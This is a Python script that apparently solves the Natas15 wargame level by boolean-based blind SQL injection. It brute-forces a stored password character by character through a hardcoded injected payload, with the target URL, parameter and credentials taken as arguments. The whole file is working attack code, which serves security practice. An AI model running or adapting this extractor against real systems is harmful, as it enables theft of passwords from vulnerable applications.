#!/usr/bin/env python3
import argparse
import requests
import string
import time

def parse_args():
    p = argparse.ArgumentParser(description="Blind SQL Injection Extractor (boolean-based)")
    p.add_argument("--url", required=True, help="Target URL (e.g. http://.../ or .../index.php)")
    p.add_argument("--user", required=True, help="HTTP basic auth username")
    p.add_argument("--password", required=True, help="HTTP basic auth password")
    p.add_argument("--param", required=True, help="Vulnerable parameter name (e.g. username)")
    p.add_argument("--true-string", required=True, help="String indicating TRUE condition (exact substring)")
    p.add_argument("--max-length", type=int, default=32, help="Max length of extracted value")
    p.add_argument("--delay", type=float, default=0.0, help="Delay between requests (seconds)")
    p.add_argument("--method", choices=["GET", "POST"], default="POST", help="HTTP method (Natas15 is POST)")
    p.add_argument("--cookie", default=None, help='Optional Cookie header value (rarely needed), e.g. "foo=bar; baz=qux"')
    return p.parse_args()

def send_payload(url, auth, param, payload, true_string, method="POST", cookie=None):
    headers = {}
    if cookie:
        headers["Cookie"] = cookie

    if method == "GET":
        r = requests.get(url, params={param: payload}, auth=auth, headers=headers, timeout=10)
    else:
        # Natas15 uses a form POST
        r = requests.post(url, data={param: payload}, auth=auth, headers=headers, timeout=10)

    return true_string in r.text

def build_payload(position, char):
    # Natas15-style: close quote, AND condition, comment out rest
    return f'natas16" AND BINARY SUBSTRING(password,{position},1)="{char}" -- '

def extract_secret(args):
    charset = string.ascii_letters + string.digits
    extracted = ""

    print("[*] Starting blind SQL injection...\n")

    for pos in range(1, args.max_length + 1):
        found = False
        for ch in charset:
            payload = build_payload(pos, ch)

            if send_payload(
                url=args.url,
                auth=(args.user, args.password),
                param=args.param,
                payload=payload,
                true_string=args.true_string,
                method=args.method,
                cookie=args.cookie,
            ):
                extracted += ch
                print(f"[+] Position {pos}: {ch}  ->  {extracted}")
                found = True
                break

            if args.delay:
                time.sleep(args.delay)

        if not found:
            print(f"[!] No character found at position {pos}. Stopping.")
            break

    print("\n[✓] Extraction complete:")
    print(extracted)

if __name__ == "__main__":
    args = parse_args()
    extract_secret(args)
